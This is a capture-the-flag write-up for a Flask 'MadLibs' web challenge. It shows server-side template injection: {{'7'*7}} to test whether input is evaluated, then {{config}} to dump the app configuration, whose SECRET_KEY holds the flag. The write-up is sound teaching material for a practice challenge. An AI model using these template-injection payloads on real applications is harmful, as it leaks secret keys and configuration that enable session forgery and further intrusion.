# MadLibs
web - 120 points

## Challenge 
When Ian was a kid, he loved to play goofy Madlibs all day long. Now, he's decided to write his own website to generate them!

http://web2.angstromctf.com:7777/

## Hint
Thank god for templating, or this would have been really annoying to code.

## Solution

When looking through the page, it gives us the source code at the bottom of the story
	
	MadLib generated using program found [here](http://web2.angstromctf.com:7777/get-source)

This shows us that it is a Flask template exploit of some sort.

---

I eventually found this: https://eugenekolo.com/blog/hitcon-ctf-2016-writeups/

If we put `{{'7'*7}}` in the author name, we get the parsed output!

	A Random Story
	Once upon a time, there was a very {{'7'*7}} {{'7'*7}} named {{'7'*7}}. {{'7'*7}} liked to {{'7'*7}}.

	THE END
	This MadLib with title A Random Story was created by 7777777 at 2018-03-18 07:37:07 

---

Similarly, inputting `{{config}}` gives us the flag

	A Random Story
	Once upon a time, there was a very {{config}} {{config}} named {{config}}. {{config}} liked to {{config}}.

	THE END
	This MadLib with title A Random Story was created by &lt;Config {&#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;actf{wow_ur_a_jinja_ninja}&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;LOGGER_NAME&#39;: &#39;__main__&#39;, &#39;LOGGER_HANDLER_POLICY&#39;: &#39;always&#39;, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: None, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: None, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(0, 43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: False, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: True, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None}&gt; at 2018-03-18 07:40:58 

	Click here to return to the home page. 

	MadLib generated using program found here

## Flag

	actf{wow_ur_a_jinja_ninja}
